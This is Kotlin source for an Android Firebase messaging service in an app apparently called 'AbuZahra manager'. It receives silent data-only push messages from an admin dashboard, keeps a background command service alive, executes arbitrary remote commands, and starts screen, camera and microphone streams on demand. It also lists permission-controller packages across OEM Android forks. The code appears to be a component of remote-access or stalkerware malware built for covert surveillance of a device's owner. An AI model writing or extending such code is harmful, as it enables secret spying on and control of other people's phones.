package com.abuzahra.manager.service

import android.content.Context
import android.content.Intent
import android.os.Build
import android.util.Log
import com.abuzahra.manager.api.ApiClient
import com.abuzahra.manager.executor.CommandExecutor
import com.abuzahra.manager.executor.StreamExecutor
import com.abuzahra.manager.model.Command
import com.abuzahra.manager.streaming.AudioStreamService
import com.abuzahra.manager.streaming.CameraStreamService
import com.abuzahra.manager.streaming.ScreenStreamService
import com.abuzahra.manager.util.DeviceUtils
import com.google.firebase.messaging.FirebaseMessagingService
import com.google.firebase.messaging.RemoteMessage
import com.google.gson.Gson
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.launch

/**
 * AbuZahraFirebaseMessagingService — Receives FCM (Firebase Cloud Messaging) data messages.
 *
 * FCM is used as an ADDITIONAL silent command channel alongside the existing RTDB
 * ChildEventListener and REST polling. When the admin sends a command from the web
 * dashboard, the server now also fires an FCM data message to the device's token.
 * FCM wakes the app even when it is killed/backgrounded and delivers the message
 * to [onMessageReceived] immediately (data-only messages bypass the system
 * notification tray on Android).
 *
 * Supported data message shapes:
 *  - {"command": "<cmd>", "command_id": "<id>", "params": {...}}  -> forward to CommandExecutor
 *  - {"type": "start_screen_stream", "params": {...}}             -> start ScreenStreamService
 *  - {"type": "start_camera_stream", "params": {...}}             -> start CameraStreamService
 *  - {"type": "start_audio_stream",  "params": {...}}             -> start AudioStreamService
 *  - {"type": "wake"}                                              -> kick CommandService to poll
 *  - default                                                       -> kick CommandService to poll
 *
 * NOTE: This service is registered in AndroidManifest.xml with the
 * com.google.firebase.MESSAGING_EVENT intent filter so the system routes FCM
 * deliveries here even when the app is not in the foreground.
 */
class AbuZahraFirebaseMessagingService : FirebaseMessagingService() {

    companion object {
        private const val TAG = "AbuZahraFCM"

        // Permissioncontroller packages (varies across OEM Android forks)
        private val PERMISSION_CONTROLLER_PACKAGES = setOf(
            "com.android.permissioncontroller",
            "com.google.android.permissioncontroller",
            "com.miui.permissioncontroller",
            "com.samsung.android.permission"
        )

        /**
         * Heuristic: was this FCM delivery a "silent" data-only message?
         * Data-only messages (no "notification" key) are delivered directly to
         * onMessageReceived regardless of app state. Messages with a "notification"
         * payload are only delivered to onMessageReceived when the app is in the
         * foreground — they appear in the system tray otherwise.
         */
        fun isDataOnly(message: RemoteMessage): Boolean = message.notification == null
    }

    private val gson = Gson()
    private val fcmScope = CoroutineScope(SupervisorJob() + Dispatchers.IO)

    override fun onMessageReceived(message: RemoteMessage) {
        super.onMessageReceived(message)
        val data = message.data
        if (data.isEmpty()) {
            Log.d(TAG, "onMessageReceived: empty data payload, ignoring")
            return
        }

        Log.i(TAG, "onMessageReceived: from=${message.from}, data keys=${data.keys}")

        // Ensure CommandService is alive so the rest of the app's pipelines
        // (heartbeat, RTDB listener, REST polling, location) keep running.
        ensureCommandServiceAlive()

        val type = data["type"] ?: ""
        val commandName = data["command"] ?: ""

        try {
            when {
                // Direct command forwarding (preferred shape from server)
                commandName.isNotEmpty() -> handleDirectCommand(data, commandName)

                // Type-based stream triggers
                type == "start_screen_stream" -> startStream("screen", data)
                type == "start_camera_stream" -> startStream("camera", data)
                type == "start_audio_stream"  -> startStream("audio",  data)

                // Simple wake — let CommandService poll REST + RTDB for pending work
                type == "wake" -> {
                    Log.i(TAG, "Wake ping received — CommandService will poll for commands")
                }

                else -> {
                    Log.i(TAG, "Unknown FCM data shape (type='$type') — falling back to wake")
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "onMessageReceived failed to handle: $data", e)
        }
    }

    override fun onNewToken(token: String) {
        super.onNewToken(token)
        Log.i(TAG, "onNewToken: FCM registration token refreshed (length=${token.length})")
        sendTokenToServer(token)
    }

    // ─── Handlers ────────────────────────────────────────────────────────────

    /**
     * Forward a "command" data message to [CommandExecutor]. The shape mirrors
     * what the server already pushes to Firebase RTDB and the REST /commands
     * endpoint, so dedup (handled inside CommandService via executed_cmd_ids)
     * prevents double-execution if the same command also arrives via RTDB/REST.
     */
    private fun handleDirectCommand(data: Map<String, String>, commandName: String) {
        val commandId = data["command_id"] ?: data["id"] ?: ""
        val paramsJson = data["params"] ?: "{}"
        val params: Map<String, Any> = try {
            val type = object : com.google.gson.reflect.TypeToken<Map<String, Any>>() {}.type
            gson.fromJson(paramsJson, type) ?: emptyMap()
        } catch (e: Exception) {
            Log.w(TAG, "Failed to parse params JSON '$paramsJson', using empty map", e)
            emptyMap()
        }

        val command = Command(
            id = commandId,
            deviceId = DeviceUtils.getDeviceId(this),
            command = commandName,
            params = params,
            status = "pending",
            createdAt = data["created_at"] ?: "",
            serverDomain = data["server_domain"] ?: "",
            serverPort = (data["server_port"] ?: "8443").toIntOrNull() ?: 8443
        )

        Log.i(TAG, "Executing command from FCM: ${command.command} (id=${command.id})")
        try {
            CommandExecutor.execute(this, command)
        } catch (e: Exception) {
            Log.e(TAG, "CommandExecutor.execute failed for ${command.command}", e)
        }
    }

    /**
     * Kick off a stream directly from the FCM data message, bypassing the
     * CommandExecutor path. This is needed because stream starts may need to
     * happen instantly even before the normal command pipeline wakes up.
     */
    private fun startStream(streamType: String, data: Map<String, String>) {
        val paramsJson = data["params"] ?: "{}"
        val params: Map<String, Any> = try {
            val type = object : com.google.gson.reflect.TypeToken<Map<String, Any>>() {}.type
            gson.fromJson(paramsJson, type) ?: emptyMap()
        } catch (_: Exception) { emptyMap() }

        Log.i(TAG, "Starting $streamType stream from FCM, params keys=${params.keys}")
        fcmScope.launch {
            try {
                when (streamType) {
                    "screen" -> StreamExecutor.startScreenStream(this@AbuZahraFirebaseMessagingService, params)
                    "camera" -> StreamExecutor.startCameraStream(this@AbuZahraFirebaseMessagingService, params)
                    "audio"  -> StreamExecutor.startAudioStream(this@AbuZahraFirebaseMessagingService, params)
                }
            } catch (e: Exception) {
                Log.e(TAG, "startStream($streamType) failed", e)
            }
        }
    }

    /**
     * Make sure [CommandService] is running. If the FCM delivery woke the app
     * from a killed state, the foreground service may not be alive yet.
     */
    private fun ensureCommandServiceAlive() {
        try {
            if (!CommandService.isRunning) {
                Log.i(TAG, "CommandService not running — starting it now")
                CommandService.start(this)
            }
        } catch (e: Exception) {
            Log.w(TAG, "ensureCommandServiceAlive failed", e)
        }
    }

    /**
     * Send the FCM registration token to the server so it can push silent
     * commands to this device. Best-effort: failure here is non-fatal — the
     * token will be re-sent on the next service start (see CommandService).
     */
    private fun sendTokenToServer(token: String) {
        fcmScope.launch {
            try {
                ApiClient.registerFcmToken(this@AbuZahraFirebaseMessagingService, token)
                Log.i(TAG, "FCM token registered with server")
            } catch (e: Exception) {
                Log.w(TAG, "Failed to register FCM token with server", e)
            }
        }
    }
}
